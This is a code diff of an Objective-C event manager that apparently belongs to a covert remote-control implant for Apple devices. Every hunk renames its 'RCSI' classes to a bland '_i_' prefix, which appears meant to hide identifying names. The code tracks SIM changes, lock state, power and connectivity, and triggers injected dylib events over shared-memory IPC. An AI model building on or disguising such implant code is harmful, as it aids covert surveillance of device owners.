@@ -88,7 +88,7 @@ typedef struct _batteryLevel {
 
 NSLock *connectionLock;
 
-@implementation RCSIEventManager : NSObject
+@implementation _i_EventManager : NSObject
 
 @synthesize notificationPort;
 
@@ -179,7 +179,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSIEventTimer *timer = [[RCSIEventTimer alloc] init];
+  _i_EventTimer *timer = [[_i_EventTimer alloc] init];
   
   [theEvent retain];
   
@@ -260,7 +260,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSIEventProcess *proc = [[RCSIEventProcess alloc] init];
+  _i_EventProcess *proc = [[_i_EventProcess alloc] init];
   
   [theEvent retain];
 
@@ -292,7 +292,7 @@ NSLock *connectionLock;
 
 - (void)addEventConnectivityInstance:(NSMutableDictionary*)theEvent
 {
-  RCSIEventConnectivity *conn = [[RCSIEventConnectivity alloc] init];
+  _i_EventConnectivity *conn = [[_i_EventConnectivity alloc] init];
   
   [theEvent retain];
     
@@ -312,7 +312,7 @@ NSLock *connectionLock;
 
 - (void)addEventBatteryInstance:(NSMutableDictionary*)theEvent
 {
-  RCSIEventBattery *batt = [[RCSIEventBattery alloc] init];
+  _i_EventBattery *batt = [[_i_EventBattery alloc] init];
   
   [theEvent retain];
   
@@ -338,7 +338,7 @@ NSLock *connectionLock;
 
 - (void)addEventACInstance:(NSMutableDictionary*)theEvent
 {
-  RCSIEventACPower *ac = [[RCSIEventACPower alloc] init];
+  _i_EventACPower *ac = [[_i_EventACPower alloc] init];
   
   [theEvent retain];
   
@@ -358,7 +358,7 @@ NSLock *connectionLock;
 
 - (void)addEventScreensaverInstance:(NSMutableDictionary*)theEvent
 {
-  RCSIEventScreensaver *scrsvr = [[RCSIEventScreensaver alloc] init];
+  _i_EventScreensaver *scrsvr = [[_i_EventScreensaver alloc] init];
   
   [theEvent retain];
   
@@ -378,7 +378,7 @@ NSLock *connectionLock;
 
 - (void)addEventSimChangeInstance:(NSMutableDictionary*)theEvent
 {
-  RCSIEventSimChange *sim = [[RCSIEventSimChange alloc] init];
+  _i_EventSimChange *sim = [[_i_EventSimChange alloc] init];
   
   [theEvent retain];
   
@@ -416,7 +416,7 @@ typedef struct _coreMessage_t
   NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                            length: sizeof(shMemoryLog)];
   
-  [RCSISharedMemory sendMessageToCoreMachPort: msgData 
+  [_i_SharedMemory sendMessageToCoreMachPort: msgData 
                                      withMode: kRunLoopEventManagerMode];
   
   [msgData release];
@@ -446,7 +446,7 @@ typedef struct _coreMessage_t
     
       if (EVENT_STANDBY == [[event objectForKey: @"type"] intValue])
         {
-          RCSIEventScreensaver *scr = [event objectForKey: @"object"];
+          _i_EventScreensaver *scr = [event objectForKey: @"object"];
           [scr setIsDeviceLocked:aProp];
         }
     }
@@ -499,7 +499,7 @@ typedef struct _coreMessage_t
       if (anEvent->commandType < [eventsList count])
         {
           NSMutableDictionary *event = [eventsList objectAtIndex: anEvent->flag];
-          RCSIEvent *object = [event objectForKey: @"object"];
+          _i_Event *object = [event objectForKey: @"object"];
           NSNumber *status = [NSNumber numberWithInt: 0];
           [object setEnabled: status];
         }
@@ -510,7 +510,7 @@ typedef struct _coreMessage_t
       if (anEvent->commandType < [eventsList count])
         {
           NSMutableDictionary *event = [eventsList objectAtIndex: anEvent->flag];
-          RCSIEvent *object = [event objectForKey: @"object"];
+          _i_Event *object = [event objectForKey: @"object"];
           NSNumber *status = [NSNumber numberWithInt: 1];
           [object setEnabled: status];
         }
@@ -583,30 +583,30 @@ typedef struct _coreMessage_t
 
 - (void)startRemoteEvent:(u_int)eventID
 {
-  RCSIDylibBlob *tmpBlob 
-  = [[RCSIDylibBlob alloc] initWithType:eventID 
+  _i_DylibBlob *tmpBlob 
+  = [[_i_DylibBlob alloc] initWithType:eventID 
                                  status:1 
                              attributes:DYLIB_EVENT_START_ATTRIB 
                                    blob:nil
-                               configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+                               configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
   
-  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   [tmpBlob release];
 }
 
 - (void)stopRemoteEvent:(u_int)eventID
 {
-  RCSIDylibBlob *tmpBlob 
-  = [[RCSIDylibBlob alloc] initWithType:eventID 
+  _i_DylibBlob *tmpBlob 
+  = [[_i_DylibBlob alloc] initWithType:eventID 
                                  status:1 
                              attributes:DYLIB_EVENT_STOP_ATTRIB 
                                    blob:nil
-                               configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+                               configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
   
-  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   [tmpBlob release];
 }
@@ -619,7 +619,7 @@ typedef struct _coreMessage_t
     {
       NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
     
-      RCSIEvent *eventInst = [theEvent objectForKey: @"object"];
+      _i_Event *eventInst = [theEvent objectForKey: @"object"];
     
       if (eventInst != nil)
         {
@@ -643,7 +643,7 @@ typedef struct _coreMessage_t
     {
       NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
       
-      RCSIEvent *eventInst = [theEvent objectForKey: @"object"];
+      _i_Event *eventInst = [theEvent objectForKey: @"object"];
       
       if (eventInst != nil)
         {
@@ -801,7 +801,7 @@ typedef struct _coreMessage_t
 
 - (BOOL)start
 {
-  eventsList = [[RCSIConfManager sharedInstance] eventsArrayConfig];
+  eventsList = [[_i_ConfManager sharedInstance] eventsArrayConfig];
   
   if (eventsList == nil)
     return FALSE;
